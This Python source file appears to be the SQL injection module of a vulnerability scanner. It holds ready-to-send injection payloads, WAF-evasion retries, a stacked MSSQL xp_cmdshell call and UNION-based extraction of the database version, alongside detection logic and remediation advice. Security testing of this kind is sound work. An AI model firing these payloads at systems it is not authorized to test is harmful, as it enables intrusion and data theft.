"""SentinelX module [01]: SQL injection.

Techniques: error-based (40+ DB error signatures), boolean-blind
(TRUE/FALSE differential with 3-sample statistical confirmation),
time-blind (baseline-subtracted delay detection). Safe mode: no
destructive payloads.
"""

from __future__ import annotations

import html as _html
import re
import time
from urllib.parse import urlencode as _urlencode
from urllib.parse import quote as _quote

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
from sentinelx.core.diff import is_significant_change, diff_bodies
from sentinelx.core.encoding import apply as enc_apply
from sentinelx.core.baseline import get_baseline, adaptive_delay


DB_ERRORS = [
    # MySQL / MariaDB
    (r"SQL syntax.*MySQL", "MySQL"), (r"Warning.*mysql_.*", "MySQL"),
    (r"MySQLSyntaxErrorException", "MySQL"), (r"valid MySQL result", "MySQL"),
    (r"check the manual that (corresponds to|coresponds to) your MySQL", "MySQL"),
    # PostgreSQL
    (r"PostgreSQL.*ERROR", "PostgreSQL"), (r"Warning.*\Wpg_.*", "PostgreSQL"),
    (r"valid PostgreSQL result", "PostgreSQL"), (r"Npgsql\.", "PostgreSQL"),
    # MSSQL
    (r"Driver.* SQL[\-\_\ ]*Server", "MSSQL"),
    (r"OLE DB.* SQL Server", "MSSQL"),
    (r"(\W|\A)SQL Server.*Driver", "MSSQL"),
    (r"Warning.*mssql_.*", "MSSQL"), (r"Microsoft.*ODBC.*SQL", "MSSQL"),
    (r"Incorrect syntax near", "MSSQL"),
    # Oracle
    (r"\bORA-[0-9]{5}", "Oracle"), (r"Oracle error", "Oracle"),
    (r"Oracle.*Driver", "Oracle"), (r"Warning.*\Woci_.*", "Oracle"),
    # SQLite
    (r"SQLite/JDBCDriver", "SQLite"), (r"SQLite\.Exception", "SQLite"),
    (r"System\.Data\.SQLite", "SQLite"), (r"Warning.*sqlite_.*", "SQLite"),
    # Generic / others
    (r"SQLSTATE", "Generic SQL"), (r"Syntax error.*SQL", "Generic SQL"),
    (r"Unclosed quotation mark", "MSSQL"),
    (r"quoted string not properly terminated", "Oracle"),
    (r"DB2 SQL error", "DB2"), (r"Sybase message", "Sybase"),
    (r"Informix", "Informix"), (r"Firebird", "Firebird"),
]
DB_ERROR_RES = [(re.compile(p, re.I), db) for p, db in DB_ERRORS]

ERROR_PAYLOADS = ["'", '"', "'\"", "`", "')", '")', "' OR '1'='1", '" OR "1"="1',
    # --- expanded: stacked queries, comment variants, type juggling ---
    "'; -- ", '"; -- ', "' OR 1=1-- -", '" OR 1=1-- -',
    "' OR 'a'='a", '" OR "a"="a', "') OR ('1'='1", '") OR ("1"="1',
    "' AND 1=CAST((SELECT version()) AS INT)-- -",
    "' UNION SELECT NULL-- -", "' UNION SELECT NULL,NULL-- -",
    "1' AND '1'='1", '1" AND "1"="1', "1') AND ('1'='1",
    "' OR SLEEP(0)-- -",  # benign timing probe (fast)
    "\\'", "\\\"",  # backslash escapes
    "'%00",  # null byte
    "'; EXEC xp_cmdshell('echo sx')-- -",  # MSSQL stacked (safe: echo only)
]

BOOLEAN_TRUE = [
    "' AND '1'='1", "' AND '1'='1' -- ", "' AND 1=1-- -",
    '" AND "1"="1', " AND 1=1", "' OR '1'='1",
    # --- expanded ---
    "' AND 1=1 AND '1'='1", '" AND 1=1 AND "1"="1',
    "' AND 'a'='a", "' OR 1=1-- -", "1' AND '1'='1' -- ",
    "') AND ('1'='1", "' AND 2>1-- -",
]
BOOLEAN_FALSE = [
    "' AND '1'='2", "' AND '1'='2' -- ", "' AND 1=2-- -",
    '" AND "1"="2', " AND 1=2", "' OR '1'='2",
    # --- expanded ---
    "' AND '1'='2' AND '1'='1", '" AND "1"="2" AND "1"="1',
    "' AND 'a'='b", "' OR 1=2-- -", "1' AND '1'='2' -- ",
    "') AND ('1'='2", "' AND 2>3-- -",
]

TIME_PAYLOADS = [
    # (dbname, payload_template, delay_scale) — delay computed adaptively
    # from baseline RTT via adaptive_delay(); templates use {d} for seconds
    ("MySQL", "' AND SLEEP({d})-- -"),
    ("MySQL", "' AND (SELECT SLEEP({d}))-- -"),
    ("PostgreSQL", "' AND pg_sleep({d})-- -"),
    ("MSSQL", "'; WAITFOR DELAY '0:0:{d}'-- -"),
    ("Oracle", "' AND DBMS_LOCK.SLEEP({d})-- -"),
]

def _order_by_tech(payloads: list, config) -> list:
    """Smart mode: order time payloads by detected tech stack.
    PHP -> MySQL first; Python/Django/Flask -> PostgreSQL/SQLite;
    ASP.NET -> MSSQL. Unknown tech: original order."""
    if not config.smart or not config.tech_stack:
        return payloads
    tech = " ".join(config.tech_stack).lower()
    priority = []
    if "php" in tech or "wordpress" in tech or "laravel" in tech:
        priority = ["MySQL", "PostgreSQL", "MSSQL", "Oracle"]
    elif "django" in tech or "flask" in tech or "python" in tech:
        priority = ["PostgreSQL", "MySQL", "Oracle", "MSSQL"]
    elif "asp.net" in tech or "iis" in tech:
        priority = ["MSSQL", "MySQL", "PostgreSQL", "Oracle"]
    elif "express" in tech or "node" in tech:
        priority = ["MySQL", "PostgreSQL", "MSSQL", "Oracle"]
    if not priority:
        return payloads
    ordered = []
    for db in priority:
        ordered.extend([p for p in payloads if p[0] == db])
    ordered.extend([p for p in payloads if p not in ordered])
    return ordered

# UNION-based extraction: marker-wrapped version functions per DBMS dialect.
UNION_MARKER = "SXV"
UNION_VERSION_TEMPLATES = [
    ("MySQL", f"CONCAT('{UNION_MARKER}',version(),'{UNION_MARKER}')"),
    ("SQLite", f"'{UNION_MARKER}'||sqlite_version()||'{UNION_MARKER}'"),
    ("MSSQL", f"('{UNION_MARKER}'+CAST(@@version AS varchar(200))+'{UNION_MARKER}')"),
    ("PostgreSQL", f"('{UNION_MARKER}'||version()||'{UNION_MARKER}')"),
    ("Oracle", f"('{UNION_MARKER}'||(SELECT banner FROM v$version WHERE rownum=1)||'{UNION_MARKER}')"),
]
UNION_MARKER_RE = re.compile(re.escape(UNION_MARKER) + r"(.{1,120}?)" + re.escape(UNION_MARKER))


def _clean_marker(text: str) -> str:
    """Return the first marker capture that looks like a rendered value,
    skipping captures from the echoed payload itself."""
    for m in UNION_MARKER_RE.finditer(text):
        g = m.group(1).strip()
        if not g:
            continue
        if any(t in g for t in ("sqlite_version", "version()", "@@version",
                                "banner", "||", "(", ")", "'", '"', ";", "--")):
            continue  # this capture is the echoed payload, not rendered output
        return g
    return ""

REMEDIATION_SQLI = (
    "Use parameterized queries / prepared statements for every database call. "
    "Never concatenate user input into SQL. Apply least-privilege DB accounts, "
    "validate and type-check input server-side, and hide detailed DB errors from users."
)


def detect_db_error(body: str) -> str | None:
    for rx, db in DB_ERROR_RES:
        if rx.search(body):
            return db
    return None


async def _send(client: ScanClient, method: str, url: str, params: dict,
                param: str, value: str):
    """Send request with one param replaced by value. Returns (resp, final_url, body_sent)."""
    p = dict(params); p[param] = value
    t0 = time.monotonic()
    if method == "GET":
        qs = _urlencode(p)
        full = url + ("&" if "?" in url else "?") + qs
        resp = await client.get(full)
        body = None
    else:
        resp = await client.post(url, data=p)
        full, body = url, _urlencode(p).encode()
    elapsed = time.monotonic() - t0
    return resp, full, body, elapsed


def _evidence(method, url, req_headers, body_sent, resp) -> Evidence:
    rbody = resp.content if resp else b""
    return Evidence(
        request_raw=raw_request(method, url, req_headers, body_sent),
        response_raw=raw_response(resp.status_code if resp else 0,
                                  dict(resp.headers) if resp else {}, rbody),
        proof="",
    )


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    if not params:
        return findings
    headers = {"User-Agent": config.user_agent}

    for param in params:
        # ---- shared baseline (fetched once per endpoint, reused by all modules) ----
        bl = await get_baseline(client, method, url, params)
        if not bl or not bl.stable:
            continue  # unstable baseline; skip to avoid false positives
        base_body, base_status, base_time = bl.body, bl.status, bl.avg_time
        # adaptive time-blind delay scaled to measured RTT
        delay = adaptive_delay(base_time)

        # ---- 1. error-based ----
        error_hit = False
        waf_blocked = False
        for payload in ERROR_PAYLOADS:
            resp, full, body_sent, elapsed = await _send(
                client, method, url, params, param, params[param] + payload)
            if not resp:
                continue
            # track WAF blocks for conditional evasion retry
            if resp.status_code == 403 and re.search(
                    r"waf|blocked|forbidden|incapsula|cloudflare|akamai|sucuri",
                    resp.text, re.I):
                waf_blocked = True
            db = detect_db_error(resp.text)
            if db and not detect_db_error(base_body):
                ev = _evidence(method, full, headers, body_sent, resp)
                ev.proof = f"Database error signature for {db} appeared only with payload"
                findings.append(Finding(
                    type="SQL Injection", subtype="error-based",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=0.95, url=full, method=method, param=param,
                    payload=payload, evidence=ev, cwe="CWE-89",
                    owasp="A03:2021 – Injection",
                    remediation=REMEDIATION_SQLI,
                    references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                ))
                error_hit = True
                break

        # WAF evasion: only if blocked and no hit — retry top payloads with
        # transforms (conditional, not multiplicative)
        if waf_blocked and not error_hit:
            for payload in ERROR_PAYLOADS[:4]:
                for transform in ("sql_comment", "mixed_case"):
                    evar = enc_apply(params[param] + payload, transform)
                    resp, full, body_sent, _ = await _send(
                        client, method, url, params, param, evar)
                    if not resp:
                        continue
                    db = detect_db_error(resp.text)
                    if db and not detect_db_error(base_body):
                        ev = _evidence(method, full, headers, body_sent, resp)
                        ev.proof = (f"Database error signature for {db} via WAF-evasion "
                                    f"({transform}) — WAF bypassed")
                        findings.append(Finding(
                            type="SQL Injection", subtype="error-based-waf-bypass",
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            confidence=0.90, url=full, method=method, param=param,
                            payload=evar, evidence=ev, cwe="CWE-89",
                            owasp="A03:2021 – Injection",
                            remediation=REMEDIATION_SQLI,
                            references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                        ))
                        error_hit = True
                        break
                if error_hit:
                    break

        # ---- 2. boolean-blind: TRUE vs FALSE, 3 samples each ----
        # (skip if error-based already confirmed SQLi on this param)
        sqli_confirmed = any(f.param == param and f.type == "SQL Injection"
                             for f in findings)
        if not sqli_confirmed:
            true_bodies, false_bodies = [], []
            for _ in range(3):
                rt, full_t, _, _ = await _send(
                    client, method, url, params, param, params[param] + BOOLEAN_TRUE[0])
                rf, full_f, _, _ = await _send(
                    client, method, url, params, param, params[param] + BOOLEAN_FALSE[0])
                if rt: true_bodies.append(rt.text)
                if rf: false_bodies.append(rf.text)
            if len(true_bodies) == 3 and len(false_bodies) == 3:
                true_stable = len(set(true_bodies)) == 1
                false_stable = len(set(false_bodies)) == 1
                differ = true_bodies[0] != false_bodies[0]
                true_matches_base, _ = is_significant_change(
                    base_body, true_bodies[0], base_status, base_status)
                false_differs, _ = is_significant_change(
                    base_body, false_bodies[0], base_status, base_status)
                if true_stable and false_stable and differ and not true_matches_base and false_differs:
                    resp, full, body_sent, _ = await _send(
                        client, method, url, params, param, params[param] + BOOLEAN_TRUE[0])
                    ev = _evidence(method, full, headers, body_sent, resp)
                    ev.proof = ("TRUE payload reproduced baseline exactly (3/3 samples); "
                                "FALSE payload changed content (3/3 samples)")
                    findings.append(Finding(
                        type="SQL Injection", subtype="boolean-blind",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        confidence=0.90, url=full, method=method, param=param,
                        payload=BOOLEAN_TRUE[0], evidence=ev, cwe="CWE-89",
                        owasp="A03:2021 – Injection",
                        remediation=REMEDIATION_SQLI,
                        references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                    ))

        # ---- 3. time-blind with baseline subtraction (adaptive delay) ----
        # (skip if SQLi already confirmed on this param by cheaper techniques)
        sqli_confirmed = any(f.param == param and f.type == "SQL Injection"
                             for f in findings)
        if (config.safe_mode or True) and not sqli_confirmed:  # SLEEP is non-destructive
            for dbname, tmpl in _order_by_tech(TIME_PAYLOADS, config):
                payload = tmpl.format(d=int(delay))
                # measure baseline jitter with 2 normal samples first (already have base_time)
                t0 = time.monotonic()
                resp, full, body_sent, elapsed = await _send(
                    client, method, url, params, param, params[param] + payload)
                if not resp:
                    continue
                # confirm: second sample must also show delay
                t1 = time.monotonic()
                resp2, _, _, elapsed2 = await _send(
                    client, method, url, params, param, params[param] + payload)
                if not resp2:
                    continue
                # delay counts if both samples exceed baseline + delay*0.7
                # and baseline itself was fast (< delay*0.5)
                threshold = base_time + delay * 0.7
                if (elapsed >= threshold and elapsed2 >= threshold
                        and base_time < delay * 0.5):
                    ev = _evidence(method, full, headers, body_sent, resp)
                    ev.proof = (f"Response delayed {elapsed:.1f}s and {elapsed2:.1f}s "
                                f"(baseline {base_time:.2f}s) with {dbname} time payload")
                    findings.append(Finding(
                        type="SQL Injection", subtype="time-blind",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        confidence=0.85, url=full, method=method, param=param,
                        payload=payload, evidence=ev, cwe="CWE-89",
                        owasp="A03:2021 – Injection",
                        remediation=REMEDIATION_SQLI,
                        references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                    ))
                    break

        # ---- 4. UNION-based: column discovery -> NULL probe -> version extraction ----
        # try string context (') then numeric context ('') for ORDER BY / UNION.
        # ORDER BY n is compared against ORDER BY 1 (not the baseline) with the
        # echoed payload normalized away (raw, HTML-escaped, URL-encoded forms),
        # so echoing pages don't false-trigger. A stricter 0.60 similarity bar
        # is used here because ORDER BY only needs to detect the error cliff.
        def _norm(body: str, sent_value: str) -> str:
            variants = {
                sent_value,
                _html.escape(sent_value),
                (sent_value.replace("&", "&#38;").replace("'", "&#39;")
                 .replace('"', "&#34;").replace("<", "&#60;").replace(">", "&#62;")),
                _quote(sent_value, safe=""),
            }
            for v in variants:
                if v:
                    body = body.replace(v, "SXNORM")
            return body

        col_count, ctx_quote = 0, ""
        for q in ("'", ""):
            v1 = params[param] + f"{q} ORDER BY 1-- -"
            r1, _, _, _ = await _send(client, method, url, params, param, v1)
            if not r1:
                break
            if detect_db_error(r1.text) and not detect_db_error(base_body):
                continue  # wrong context: ORDER BY 1 must not error
            n1 = _norm(r1.text, v1)
            found = 0
            for n in range(2, 11):
                vn = params[param] + f"{q} ORDER BY {n}-- -"
                rn, _, _, _ = await _send(client, method, url, params, param, vn)
                if not rn:
                    break
                db_err = bool(detect_db_error(rn.text)) and not detect_db_error(r1.text)
                status_flip = rn.status_code != r1.status_code
                sim, _ = diff_bodies(n1, _norm(rn.text, vn))
                if db_err or status_flip or sim < 0.60:
                    found = n - 1
                    break
            else:
                continue  # all ORDER BYs behaved like 1 — wrong context, try next
            if found >= 1:
                col_count, ctx_quote = found, q
                break
        if col_count >= 1:
            nulls = ",".join(["NULL"] * col_count)
            # Straight to marker-based extraction: a reflected SXV<version>SXV
            # marker is definitive proof of UNION injection (no NULL-probe gate,
            # because app-layer error handlers can mask a working UNION point).
            db_version, dbms = "", ""
            union_full, union_body_sent, union_resp = "", None, None
            for i in range(min(col_count, 5)):
                if db_version:
                    break
                for dbname, template in UNION_VERSION_TEMPLATES:
                    cols = ["NULL"] * col_count
                    cols[i] = template
                    suffix = f"{ctx_quote} UNION SELECT {','.join(cols)}-- -"
                    for variant in (suffix, enc_apply(suffix, "sql_comment")):
                        resp, full, body_sent, _ = await _send(
                            client, method, url, params, param,
                            params[param] + variant)
                        if not resp:
                            continue
                        hit = _clean_marker(resp.text)
                        if hit:
                            db_version, dbms = hit, dbname
                            union_full, union_body_sent = full, body_sent
                            # re-fetch clean evidence for the report
                            union_resp = resp
                            break
                    if db_version:
                        break
            if db_version:
                ev = _evidence(method, union_full, headers, union_body_sent, union_resp)
                ev.proof = (
                    f"ORDER BY probe: column count = {col_count}; "
                    f"UNION SELECT injected and rendered server-side; "
                    f"extracted database version '{db_version}' ({dbms}) via marker reflection"
                )
                findings.append(Finding(
                    type="SQL Injection", subtype="union-based",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=0.93, url=union_full, method=method, param=param,
                    payload=f"{ctx_quote} UNION SELECT {nulls}-- -", evidence=ev, cwe="CWE-89",
                    owasp="A03:2021 – Injection",
                    remediation=REMEDIATION_SQLI,
                    references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                ))
    return findings
